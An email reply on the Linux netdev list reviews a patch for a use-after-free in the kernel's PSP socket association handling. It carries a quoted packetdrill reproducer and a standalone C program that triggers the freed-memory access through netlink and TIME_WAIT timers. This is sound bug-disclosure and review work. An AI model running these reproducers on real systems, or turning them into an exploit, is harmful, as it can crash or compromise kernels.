Received: from mail-ej1-f41.google.com (mail-ej1-f41.google.com [209.85.218.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C7C673BFAEB
	for <netdev@vger.kernel.org>; Sun, 30 Aug 2026 18:07:30 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.218.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788113254; cv=none; b=sQTkxtc/ibSovWJUJClU3Vctx3Klnc8EGk0Apl425LfhZFaylLEHYaGU9P13AH1yRF67pFUO3Eqa8+TnotRbq3E88qtp8hRaeLLabiIrwL8lpU0ALxX+RdxcQIQ/o0tEYI4YluQb1sM6L5IaKtxgpvITYkiKcGHdJR0kMWq7FVE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788113254; c=relaxed/simple;
	bh=oEBz5XYjnHMGuWPAWXU7+dTHXWwlKpaOVGZofkaRH1M=;
	h=Content-Type:Mime-Version:Subject:From:In-Reply-To:Date:Cc:
	 Message-Id:References:To; b=BgF99d/m9gPNck365PTMagtzX4YVyEKeTzKclZOXXywzbNH3ucQeKjI5JmTyjBwJ0ZYjROcQVrTpjkSQhX84yAWKJ1i0sVM808W/nNxqnoERdU/8Pzhokth5kywgO77TH3EcFliDPxutDWNCW4sjnmC1LpqtESXh1gvqp/Okj/0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=doyensec.com; spf=pass smtp.mailfrom=doyensec.com; dkim=pass (2048-bit key) header.d=doyensec.com header.i=@doyensec.com header.b=efTjA0D1; arc=none smtp.client-ip=209.85.218.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=doyensec.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=doyensec.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=doyensec.com header.i=@doyensec.com header.b="efTjA0D1"
Received: by mail-ej1-f41.google.com with SMTP id a640c23a62f3a-c1600d040e4so444795266b.1
        for <netdev@vger.kernel.org>; Sun, 30 Aug 2026 11:07:30 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=doyensec.com; s=google; t=1788113248; x=1788718048; darn=vger.kernel.org;
        h=to:references:message-id:content-transfer-encoding:cc:date
         :in-reply-to:from:subject:mime-version:content-type:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=v2N3Jtl0RJJ0yv/0SBiR9bXRYTWAzlXHXI8Cl+yCiEU=;
        b=efTjA0D1H4c+yA7zRrpW1Y9H4GVDT9ZtgM1K0uo8ofqFjyfELryHc85YW4ExK+u2ot
         LXQv0m2C3diBATluDdTdozYzPru2H71QR88p3cw3EVH3U4K2kJ1/4cZr5R2GRk4OsBJ3
         adDfwGP8mPGf4xCYcn9Q10EO+jW2M+avLlTwWDZ9IQDgpWHskQaIRB2y8Q5kpb215Hh1
         4bH0fBxoleMfTNTJ6q2ocyEnygn93oNNw7z9kEUkYWu6VmFNv9h08ooWY0PNKj50Wymq
         LlMCMcFtalo3mUD0SU8G8p1AwA36BlwIb+3ovVl14+VgDXB7/p+NfTDaxo5dXEGId0dh
         2iMQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788113248; x=1788718048;
        h=to:references:message-id:content-transfer-encoding:cc:date
         :in-reply-to:from:subject:mime-version:content-type:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=v2N3Jtl0RJJ0yv/0SBiR9bXRYTWAzlXHXI8Cl+yCiEU=;
        b=IW6iT2XuE/OJREdKAO8kzg4VhmRvziPfLj+U/FdYAD3N24XXPBX2tHQOjcUfH8mnij
         at+Z1Kl3qF+SNuUE2ERusa7Nh6i1v2OEhclbPb0cBESJyizmIHzWeG8QtQJ4d1KOas7h
         ou2gEL7YvteNdEbuWWToZa9gMXqAmaAEX8Kwz7EfB5OrvC8FX124aP9koXkTSa9YzWjC
         fF8y086itCXPwdStTJ84p6HLFWkjmyZdJPB6QYn6rcT1fVIfRNVAvK8tfPAzPt/yP0+O
         WwUgeD0EZQcvrzKTLTmbVyfh7hbgFbpduAm8IiZ+4LWFL1HwAkWhowooGLFMp38ynvJ9
         pSkQ==
X-Gm-Message-State: AFuF++n/t469Q8Y5F9o5ZwUxsdPZkO4vDZ0AabjbVXtuy4DrVJmN1BuG
	KMP1RlYDAoEpYZi48pjBaB8QHNgMVp2pifHB3mdODnLk37Bu12hCMXJhbghZJq6Uy5NjVgzDooD
	Dj1uOK2ItNA==
X-Gm-Gg: AR+sD12BmkwiEYToWfpRv8ER4kXZHfZKQNz1nLcHZw4vTtPEsOLh+LsLpGsOFLLK+U2
	bkINuuLTN2dnqnf2TrQYq1WD9McF9UoNA32x2RxCk27+BiH8QHOymXFqghmjpB2IVXFE0subDIH
	4IUM/yo7qUju5KWYvTdmZrHAGZS5V3sTDaOa+PXm89dlGrwqpvUEl6HWccHTtNUQbOIW9n5TlFa
	9iO+GcNlFboBpvVehJdYjv0wFDrvdTMI50pxRAN0HnM+TI4IomPlPZe346ZDnh0aQjdlSUBD4vY
	r7wpatsRFUdofl3yEyPndSltf9HYssXmLJM81brJEmC4GKMVhrt66AviYBxj7pfwWJp9eOTUFjb
	WmwaDSwefPdFklcArSpURX43T0MNupPP+7AYv+X0fpMMsVbMGrGUxDPdYb2JXQn2pYyxtrI0h8/
	BXEvQEBLnQV+pEDu93MY11PEhuOFK9pUqiZqc42jdSXSWBXC4PizG/zMQ4zhG+AhnhyXqkf3Fey
	G0teCnClmQdtFigSG9VTSOugypgEj0VDVgGEv6FpywaX4t0vUnH/EknfRqXJMeRDPAdA7BknnHi
	MiPiNGT6zTbf1Ddcyntr13Y20ZMi+cw2cVM1Dw==
X-Received: by 2002:a17:907:3d44:b0:c25:4ca3:dfd8 with SMTP id a640c23a62f3a-c25966e2086mr152386566b.2.1788113247613;
        Sun, 30 Aug 2026 11:07:27 -0700 (PDT)
Received: from smtpclient.apple (83.10.35.35.ipv4.supernova.orange.pl. [83.10.35.35])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c255f25151asm323007466b.58.2026.08.30.11.07.25
        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
        Sun, 30 Aug 2026 11:07:26 -0700 (PDT)
Content-Type: text/plain;
	charset=us-ascii
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3826.700.81.1.4\))
Subject: Re: [PATCH net] net: psp: do not inherit the Rx association on clone
From: Norbert Szetei <norbert@doyensec.com>
In-Reply-To: <DL1PV8WQ5ZC7.1128ZBRNUPNUS@gmail.com>
Date: Sun, 30 Aug 2026 20:07:14 +0200
Cc: netdev@vger.kernel.org,
 Eric Dumazet <edumazet@google.com>,
 Kuniyuki Iwashima <kuniyu@google.com>,
 Paolo Abeni <pabeni@redhat.com>,
 Willem de Bruijn <willemb@google.com>,
 "David S. Miller" <davem@davemloft.net>,
 Jakub Kicinski <kuba@kernel.org>,
 Simon Horman <horms@kernel.org>,
 linux-kernel@vger.kernel.org
Content-Transfer-Encoding: quoted-printable
Message-Id: <64F8DA04-30A9-41B5-91DE-7559F1CC65D2@doyensec.com>
References: <BC10EB92-ABB3-41B2-AB16-266BEEBE18C0@doyensec.com>
 <DL1PV8WQ5ZC7.1128ZBRNUPNUS@gmail.com>
To: Daniel Zahka <daniel.zahka@gmail.com>
X-Mailer: Apple Mail (2.3826.700.81.1.4)

On Aug 29, 2026, at 22:40, Daniel Zahka <daniel.zahka@gmail.com> wrote:
>=20
> On Sat Aug 29, 2026 at 12:56 PM EDT, Norbert Szetei wrote:
>> sk->psp_assoc sits past sk_dontcopy_end, so sock_copy() copies it =
into
>> every socket accepted from a listener without taking a reference, =
while
>> inet_sock_destruct() puts for every inet socket. psp_twsk_init() does
>> refcount_inc() for the timewait socket, so a child closing through
>> TIME_WAIT cancels its own put and leaves the association with one
>> reference and N timewait sockets holding the same pointer. Closing =
the
>> listener frees it, and the timewait timers then put freed memory.
>>=20
>> Rejecting the association on a listening socket is not sufficient: a =
socket
>> can acquire one while established and then be turned back into a =
listener,
>> because tcp_disconnect() leaves sk->psp_assoc in place.
>>=20
>>  BUG: KASAN: slab-use-after-free in psp_twsk_assoc_free+0x6f/0xf0
>>  Write of size 4 at addr ffff888110f9255c by task swapper/7/0
>>   psp_twsk_assoc_free+0x6f/0xf0
>>   inet_twsk_put+0xda/0x1b0
>>   call_timer_fn+0x53/0x2e0
>>   __run_timers+0x764/0xa80
>>  Freed by task 99:
>>   kfree+0x1a7/0x500
>>   process_one_work+0x7ec/0x1100
>>=20
>> An association carries a per-connection SPI and key, so a child must =
not
>> inherit the parent's. Clear it on clone.
>>=20
>> Fixes: 6b46ca260e22 ("net: psp: add socket security association =
code")
>> Cc: stable@vger.kernel.org
>> Assisted-by: Claude:claude-opus-5
>> Signed-off-by: Norbert Szetei <norbert@doyensec.com>
>=20
> Thanks. Nit: I think the commit message overemphasizes the timewait
> paths being part of reaching the bug. I suppose that is because the
> included trace went that route, but I think anything that happens =
after
> the copying of the socket's psp_assoc without taking a refcount will
> reach the same issue.

Agreed, and your packetdrill test shows it better than my commit log =
does.
I can drop or change that paragraph in a v2 if you or the maintainers =
would=20
prefer it, otherwise I will leave the patch as is so as not to reset =
your=20
review.

> The fix looks appropriate to me. I also think disallowing rx-assoc =
might
> be something that we ought to do.

That was my first attempt, and it is how I ended up with this patch
instead. I rejected rx-assoc unless sk_state was TCP_ESTABLISHED, in
psp_sock_assoc_set_rx(). That closes the obvious route, but a socket can
still pick up an association while established and then be turned back
into a listener:

  connect()            -> ESTABLISHED
  rx-assoc             -> allowed, the socket is established
  connect(AF_UNSPEC)   -> tcp_disconnect() has no psp handling, so
                          sk->psp_assoc survives, sk_state is TCP_CLOSE
  listen()             -> __inet_listen_sk() accepts TCPF_CLOSE

which is a listener holding an association again. I still think it is =
worth=20
doing on top of this, though.

> Reviewed-by: Daniel Zahka <daniel.zahka@gmail.com>
>=20
>> ---
>> Reproducer available on request.
>>=20
>=20
> Sure. Let's see it. Here's one with packetdrill and netdevsim:
>=20
> cat gtests/net/psp/repro/psp-listen-assoc-uaf.pkt=20
> // Expected on an unfixed kernel:
> //
> //   BUG: KASAN: slab-use-after-free in psp_assoc_put.part.0+0x1b/0x60
> //   Write of size 4 at addr ff11000112918a60 by task swapper/3/0
> //    psp_assoc_put.part.0+0x1b/0x60
> //    __sk_destruct+0x7b/0x630
> //    rcu_core+0x508/0x1470
> //   Allocated by task 258:
> //    psp_assoc_create+0xb7/0x3f0
> //    psp_nl_rx_assoc_doit+0x1cc/0xae0
> //   Freed by task 77:
> //    kfree+0x321/0x500
> //    process_one_work+0x89f/0x18a0
> //
> //   refcount_t: underflow; use-after-free.
>=20
> --psp_udp_port=3D1000
>=20
> // Initialize a listening socket.
>    0 socket(..., SOCK_STREAM, IPPROTO_TCP) =3D 3
>   +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) =3D 0
>   +0 bind(3, ..., ...) =3D 0
>   +0 listen(3, 1) =3D 0
>=20
>   +0 psp_rx_assoc(3, [7]) =3D 0
>=20
> // Complete a handshake. The child cloned here silently shares the
> // listener's psp_assoc pointer with no reference of its own.
>  +.1 < S 0:0(0) win 50000 <mss 1000,nop,wscale 0>
>   +0 > S. 0:0(0) ack 1 <mss MSS,nop,wscale 8>
>  +.1 < . 1:1(0) ack 1 win 50000
>   +0 accept(3, ..., ...) =3D 4
>=20
> // Reset the child so close() destroys it right away rather than =
parking
> // it in FIN_WAIT/TIME_WAIT.
>  +.1 < R. 1:1(0) ack 1 win 0
>=20
> // First put drops the only refcnt
>   +0 close(4) =3D 0
>=20
>  +.5 `sleep 0.5`
>=20
> // Second put: psp_assoc_put() touches freed memory
>   +0 close(3) =3D 0
>=20
> // Keep the VM alive long enough for the splat to reach the console.
>  +.5 `sleep 1`

Mine is a standalone C program that takes the other route, children =
closed=20
normally, so the UAF is triggered from the timewait timers. It uses=20
netdevsim too, I ran `echo "1 1" > /sys/bus/netdevsim/new_device` first.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>

/* from include/uapi/linux/psp.h */
#define PSP_CMD_DEV_GET		1
#define PSP_CMD_RX_ASSOC	8
#define PSP_A_DEV_ID		1
#define PSP_A_ASSOC_DEV_ID	1
#define PSP_A_ASSOC_VERSION	2
#define PSP_A_ASSOC_SOCK_FD	5

#define NR_CHILDREN		4

static int gfd;

static void put_u32(char *buf, int *len, int type, unsigned int val)
{
	struct nlattr *a =3D (struct nlattr *)(buf + NLMSG_ALIGN(*len));

	a->nla_type =3D type;
	a->nla_len =3D NLA_HDRLEN + 4;
	memcpy((char *)a + NLA_HDRLEN, &val, 4);
	*len =3D NLMSG_ALIGN(*len) + NLA_ALIGN(a->nla_len);
}

/* returns <0 on netlink error, else the reply length */
static int genl(int family, int cmd, int flags, const char *attrs, int =
alen,
		char *rbuf, int rlen)
{
	struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
	char buf[1024];
	struct nlmsghdr *n =3D (struct nlmsghdr *)buf;
	struct genlmsghdr *g =3D (struct genlmsghdr *)NLMSG_DATA(n);
	int len;

	memset(buf, 0, sizeof(buf));
	n->nlmsg_len =3D NLMSG_LENGTH(GENL_HDRLEN);
	n->nlmsg_type =3D family;
	n->nlmsg_flags =3D NLM_F_REQUEST | flags;
	n->nlmsg_seq =3D 1;
	g->cmd =3D cmd;
	g->version =3D 1;
	if (alen) {
		memcpy(buf + NLMSG_ALIGN(n->nlmsg_len), attrs, alen);
		n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + alen;
	}
	if (sendto(gfd, buf, n->nlmsg_len, 0,
		   (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -errno;
	len =3D recv(gfd, rbuf, rlen, 0);
	if (len < 0)
		return -errno;
	n =3D (struct nlmsghdr *)rbuf;
	if (n->nlmsg_type =3D=3D NLMSG_ERROR)
		return ((struct nlmsgerr *)NLMSG_DATA(n))->error;
	return len;
}

static int get_u32(char *msg, int len, int want, unsigned int *out)
{
	struct nlmsghdr *n =3D (struct nlmsghdr *)msg;
	struct nlattr *a;
	int alen;

	if (!NLMSG_OK(n, len))
		return -1;
	a =3D (struct nlattr *)((char *)NLMSG_DATA(n) + GENL_HDRLEN);
	alen =3D NLMSG_PAYLOAD(n, GENL_HDRLEN);
	for (; alen >=3D (int)NLA_HDRLEN && a->nla_len >=3D NLA_HDRLEN =
&&
	       a->nla_len <=3D alen;
	     alen -=3D NLA_ALIGN(a->nla_len),
	     a =3D (struct nlattr *)((char *)a + NLA_ALIGN(a->nla_len))) =
{
		if ((a->nla_type & NLA_TYPE_MASK) =3D=3D want) {
			memcpy(out, (char *)a + NLA_HDRLEN, 4);
			return 0;
		}
	}
	return -1;
}

static int psp_family(void)
{
	struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
	struct { struct nlmsghdr n; struct genlmsghdr g; char b[128]; } =
req;
	char rbuf[8192];
	struct nlattr *a;
	unsigned int id;
	int len, l;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len =3D NLMSG_LENGTH(GENL_HDRLEN);
	req.n.nlmsg_type =3D GENL_ID_CTRL;
	req.n.nlmsg_flags =3D NLM_F_REQUEST;
	req.n.nlmsg_seq =3D 1;
	req.g.cmd =3D CTRL_CMD_GETFAMILY;
	req.g.version =3D 1;
	l =3D req.n.nlmsg_len;
	a =3D (struct nlattr *)((char *)&req + NLMSG_ALIGN(l));
	a->nla_type =3D CTRL_ATTR_FAMILY_NAME;
	a->nla_len =3D NLA_HDRLEN + 4;
	memcpy((char *)a + NLA_HDRLEN, "psp", 4);
	req.n.nlmsg_len =3D NLMSG_ALIGN(l) + NLA_ALIGN(a->nla_len);

	if (sendto(gfd, &req, req.n.nlmsg_len, 0,
		   (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -errno;
	len =3D recv(gfd, rbuf, sizeof(rbuf), 0);
	if (len < 0 || get_u32(rbuf, len, CTRL_ATTR_FAMILY_ID, &id))
		return -ENOENT;
	return id;
}

int main() {
	struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
	struct sockaddr_in sin;
	char attrs[256], rbuf[8192];
	unsigned int devid;
	socklen_t slen;
	int fam, lfd, cfd, afd, alen, e, i;

	gfd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (gfd < 0) {
		perror("netlink socket");
		return 1;
	}
	bind(gfd, (struct sockaddr *)&sa, sizeof(sa));

	fam =3D psp_family();
	if (fam < 0) {
		fprintf(stderr, "no \"psp\" netlink family - =
CONFIG_INET_PSP=3Dy?\n");
		return 1;
	}

	e =3D genl(fam, PSP_CMD_DEV_GET, NLM_F_DUMP, NULL, 0, rbuf, =
sizeof(rbuf));
	if (e < 0 || get_u32(rbuf, e, PSP_A_DEV_ID, &devid)) {
		fprintf(stderr, "no PSP device - create a netdevsim port =
first\n");
		return 1;
	}
	printf("psp device id %u\n", devid);

	lfd =3D socket(AF_INET, SOCK_STREAM, 0);
	memset(&sin, 0, sizeof(sin));
	sin.sin_family =3D AF_INET;
	sin.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
	if (bind(lfd, (struct sockaddr *)&sin, sizeof(sin)) ||
	    listen(lfd, NR_CHILDREN * 2)) {
		perror("bind/listen");
		return 1;
	}
	slen =3D sizeof(sin);
	getsockname(lfd, (struct sockaddr *)&sin, &slen);

	/* nothing checks sk_state, so this lands on a LISTENING socket =
*/
	alen =3D 0;
	put_u32(attrs, &alen, PSP_A_ASSOC_SOCK_FD, lfd);
	put_u32(attrs, &alen, PSP_A_ASSOC_DEV_ID, devid);
	put_u32(attrs, &alen, PSP_A_ASSOC_VERSION, 0);
	e =3D genl(fam, PSP_CMD_RX_ASSOC, 0, attrs, alen, rbuf, =
sizeof(rbuf));
	if (e < 0) {
		fprintf(stderr, "rx-assoc on listener: %s\n", =
strerror(-e));
		return 1;
	}
	printf("rx-assoc installed on the listening socket (port %d)\n",
	       ntohs(sin.sin_port));

	/* every accepted child aliases the association without a =
reference */
	for (i =3D 0; i < NR_CHILDREN; i++) {
		cfd =3D socket(AF_INET, SOCK_STREAM, 0);
		if (connect(cfd, (struct sockaddr *)&sin, sizeof(sin))) =
{
			perror("connect");
			return 1;
		}
		afd =3D accept(lfd, NULL, NULL);
		if (afd < 0) {
			perror("accept");
			return 1;
		}
		close(afd);	/* -> TIME_WAIT, psp_twsk_init() takes a =
ref */
		close(cfd);
	}
	printf("accepted and closed %d children\n", NR_CHILDREN);

	close(lfd);		/* drops the last ref: association is =
freed */
	printf("listener closed; waiting ~75s for the TIME_WAIT =
timers\n");
	fflush(stdout);
	sleep(75);		/* timers fire -> put on freed memory */

	printf("done - check dmesg for the KASAN report\n");
	return 0;
}


